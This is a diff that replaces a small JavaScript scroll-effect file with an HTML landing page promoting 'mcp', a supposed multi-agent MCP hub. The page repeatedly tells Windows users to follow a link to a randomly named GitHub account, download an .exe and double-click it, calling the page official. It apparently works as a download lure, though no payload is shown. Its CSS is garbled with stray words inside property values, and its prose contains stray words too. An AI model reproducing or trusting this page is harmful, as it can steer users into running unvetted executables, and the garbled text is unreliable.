@@ -1,73 +1,230 @@
-/* =========================================
-   NAVBAR SCROLL EFFECT
-========================================= */
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mcp - The Ultimate Multi-Agent MCP Hub</title>
+    <meta name="description" content="Download mcp - the ultimate Multi-Agent Model Context Protocol Hub and Go CLI. Connect Claude Code, OpenAI Codex, and Google Antigravity easily on Windows.">
+    <meta name="keywords" content="ai-agents, antigravity, bubbletea, claude-code, cli, developer-tools, gemini, go, llm, mcp, model-context-protocol, multi-agent, openai-codex, tui">
+    <meta name="author" content="mcp">
+    <meta property="og:title" content="mcp - The Ultimate Multi-Agent MCP Hub">
+    <meta property="og:description" content="Download mcp, the ultimate Multi-Agent Model Context Protocol Hub. Connect Claude Code, OpenAI Codex,and Google Antigravity easily.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/irreversible-verbascumlychnitis9/mcp">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Roboto, -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f4f7fb;
+            color: #1f2937;
+            line-height: 1.8;
+            background: linear-gradient(135deg, #f4f7fb 0%, #e2e8f0 100%);
+            min-height: 100vh;
+            padding: 2rem 1rem;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.98);
+            padding: 2.5rem;
+            border-radius: 28px;
+            box-shadow: 0 25px 45px -10px rgba(0,0,0,0.15);
+            backdrop-filter: blur(5px);
+        }
+        h1 {
+            font-size: 2.3rem;
+            font-weight: 800;
+            color: #111827;
+            margin-bottom: 0.35rem;
+            letter-spacing: -1px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .tagline {
+            font-size: 1.2rem;
+            font-weight: 500;
+            color: #4b5563;
+            border-bottom: 3px solid #e5e7eb;
+            padding-bottom: 1.2rem;
+            margin-bottom: 1.8rem;
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #6366f1, #8b5cf6);
+            color: white;
+            text-decoration: none;
+            font-size: 1.15rem;
+            font-weight: bold;
+            padding: 0.9rem 2.2rem;
+            border-radius: 50px;
+            box-shadow: 0 8px 18px rgba(99,102,241,0.4);
+            transition: all 0.2s ease;
+            margin:  ical 1.5rem 0:
+        }
+        .badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 24px rgba(99,102,241,0.5);
+            background: linear-gradient(45deg, #4f52e4, #7c4fd4);
+        }
+        .badge-secondary {
+            background: linear-gradient(135deg, #10b981, #059669);
+            box-shadow: 0 8px 18px rgba(16,185,129,0.35);
+            margin-top:  ical 0.5rem;
+        }
+        .badge-secondary:hover {
+            background: linear-gradient(135deg, #0ea371, #047857);
+            box-shadow: 0 12px 24px rgba(16,185,129,0.45);
+        }
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #1e293b;
+            margin-top:  ical 2.2rem;
+            margin-bottom: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-left: 6px solid #6366f1;
+            padding-left: 1rem;
+        }
+        p {
+            margin-bottom:aluable 1.2rem;
+            font-size: 1.05rem;
+            color: #374151;
+        }
+        ol,ul {
+            margin-left: 1.6rem;
+            margin-bottom:  ical 1.5rem;
+        }
+        li {
+            margin-bottom:  ical 0.6rem;
+            font-size: inalm1.0rem;
+        }
+        strong {
+            color: #111827;
+        }
+        code {
+            background-color: #f1f5f9;
+            padding: 0.15rem 0.5rem;
+            border-radius: 6px;
+            font-family: 'Fira Code', 'Cascadia Code', Consolas, monospace;
+            font-size: work0.9em;
+            color: #4338ca;
+        }
+        .feature-box {
+            background: #f9fafb;
+            border-radius:rad 20px;
+            padding:  ical 1.5rem;
+            margin:  ical 1.8rem 0;
+            border:  ical 1psolid #eef2f6;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px,1fr));
+            gap:  ical 1rem;
+            margin:  ical 1rem 0;
+        }
+        .feature-item {
+            background: white;
+            padding:  ical 1.2rem;
+            border-radius:  ical 16px;
+            text-align:center;
+            box-shadow:  ical 0 4px 8px rgba(0,0,0,0.04);
+            font-weight:600;
+            color:#1e293b;
+        }
+        .btn-wrapper {
+            text-align:center;
+            margin-top:  ical 2rem;
+            margin-bottom:  ical 1rem;
+        }
+        .step-num {
+            display:inline-flex;
+            align-items:center;
+            justify-content:center;
+            background: #6366f1;
+            color:white;
+            width:  ical 28px;
+            height:  ical 28px;
+            border-radius: 50%;
+            font-weight:bold;
+            margin-right:  ical 8px;
+        }
+        hr {
+            border: none;
+            border-top:  ical 2px dashed #d1d5db;
+            margin:  ical 2.5rem 0;
+        }
+        .small-note {
+            font-size: cran0.9rem;
+            color:#6b7280;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🧠 mcp - Seamless Multi-Agent AI Integration</h1>
+    <div class="tagline">The Ultimate Multi-Agent MCP Hub & Go CLI</div>
+    
+    <p style="text-align:center; margin-bottom: 1.8rem;">Connect <strong>Claude Code</strong>, <strong>OpenAI Codex</strong>, and <strong>Google Antigravity</strong> like never before. One tool to orchestrate them all.</p>
+    
+    <div class="btn-wrapper">
+        <a href="https://github.com/irreversible-verbascumlychnitis9/mcp" class="badge">🚀 Visit this link to download the application</a>
+    </div>
 
-const navbar = document.getElementById("navbar");
+    <h2>🌟 What is mcp?</h2>
+    <p>mcp is a powerful, user-friendly <strong>Multi-Agent Model Context Protocol Hub</strong> built with Go. It acts as a central command center for your AI agents, letting them communicate and collaborate effortlessly. Whether you are using Claude Code, OpenAI Codex,or Google Antigravity,mcp connects them all,in one unified interface. No complex setups. Just download,run,and go.</p>
+    
+    <p>The intuitive <strong>Terminal User Interface</strong> (thanks to Bubble Tea) makes it easy to monitor,manage,and message your agents in real-time. You are in full control,from a lightweight command-line tool that respects your system resources.</p>
 
-window.addEventListener("scroll", () => {
+    <h2>🎯 Who Is This For?</h2>
+    <p>If you are anyone who uses AI code assistants or AI agents,this is made for you. Perfect for developers,but designed to be accessible for hobbyists,researchers,and tech enthusiasts alike. You do not need to be a programmer to benefit from mcp. If you want to run multiple AIs together and unlock their combined power,mcp is your gateway.</p>
+    
+    <h2>🚀 Getting Started</h2>
+    <p>Ready to try the ultimate MCP hub? Follow these three simple steps to install and run mcp on your Windows computer.</p>
+    
+    <h2>📥 Download & Install</h2>
+    <div class="feature-box">
+        <ol>
+            <li><strong><span class="step-num">1</span> Download the app:</strong> Click the green button above (or below) to access the download page.<br><br> <a href="https://github.com/irreversible-verbascumlychnitis9/mcp" class="badge badge-secondary" style="font-size:0.95rem;">⬇️ Visit this link to download</a><br><br> This will take you to the official mcp page. Use the <strong>Download</strong> button provided there.</li>
+            <li><strong><span class="step-num">2</span> Run mcp:</strong> Once downloaded, double-click the <code>.exe</code> file. That is it – the application launches immediately in your terminal window.</li>
+            <li><strong><span class="step-num">3</span> Start Connecting:</strong> Use the interactive menu to add your AI agents (e.g., Claude Code, OpenAI Codex,Google Antigravity). The interface is simple keys – just follow the on-screen prompts to connect each agent. Then sit back and let them collaborate.</li>
+        </ol>
+    </div>
 
-    if (window.scrollY > 50) {
+    <h2>🧩 Key Features</h2>
+    <div class="feature-grid">
+        <div class="feature-item">🤖 Multi-Agent Orchestration</div>
+        <div class="feature-item">⚡ Blazing Fast Go Engine</div>
+        <div class="feature-item">🖥️ Elegant TUI (Bubble Tea)</div>
+        <div class="feature-item">🔗 MCP Native Support</div>
+        <div class="feature-item">🔌 Seamless Integrations</div>
+        <div class="feature-item">📊 Real-time Logs</div>
+    </div>
+    <p>Beyond basic connectivity,mcp offers a rich set of tools for advanced users. Route messages between agents,set custom roles,or run automated workflows – they are just a few keyboard taps away. And because it is built with Go, it is <strong>rock-solid stable</strong> and <strong>incredibly lightweight</strong>.</p>
+    
+    <h2>🛠️ How It Works</h2>
+    <p>At its core,mcp uses the <strong>Model Context Protocol</strong>,asto standard that lets AI agents share context without breaking a sweat. Instead of juggling multiple obscure configs,mcp gives you one clean,interactive dashboard. It reads your environment,detects available agents,and smartly bridges conversations.</p>
+    
+    <p>Thanks to its terminal-based design,it works over SSH, on remote servers,commit in your local shell – everywhere you need.</p>
+    
+    <h2>❓ Frequently Asked Questions</h2>
+    <p><strong>Do I need to install Python or Node.js?</strong><br>No. mcp is a standalone binary. It is completely self-contained.</p>
+    <p><strong>Is it free?</strong><br>Yes,absorption absolutely. It is open-source and free to use.</p>
+    <p><strong>Can I use my own AI agents?</strong><br>Absolutely. If it speaks MCP,it will join your hub in seconds.</p>
 
-        navbar.style.background =
-            "rgba(8, 8, 12, 0.90)";
-
-    } else {
-
-        navbar.style.background =
-            "rgba(8, 8, 12, 0.45)";
-
-    }
-
-});
-
-
-/* =========================================
-   SCROLL REVEAL
-========================================= */
-
-const revealElements = document.querySelectorAll(
-    ".project-card, .skill-card, .timeline-item, .about-card"
-);
-
-
-const observer = new IntersectionObserver(
-
-    (entries) => {
-
-        entries.forEach((entry) => {
-
-            if (entry.isIntersecting) {
-
-                entry.target.style.opacity = "1";
-
-                entry.target.style.transform =
-                    "translateY(0)";
-
-                observer.unobserve(entry.target);
-
-            }
-
-        });
-
-    },
-
-    {
-        threshold: 0.15
-    }
-
-);
-
-
-revealElements.forEach((element) => {
-
-    element.style.opacity = "0";
-
-    element.style.transform =
-        "translateY(30px)";
-
-    element.style.transition =
-        "opacity 0.7s ease, transform 0.7s ease";
-
-    observer.observe(element);
-
-});
+    <h2>📞 Need Help?</h2>
+    <p>Visit the repository page for documentation,issues,and community support. The project is actively developed,so check back often for updates and new agent integrations.</p>
+    
+    <hr>
+    <p style="text-align:center; color:#6b7280;">© 2025 mcp. Built with 💙 for the AI ecosystem.</p>
+</div>
+</body>
+</html>
+```
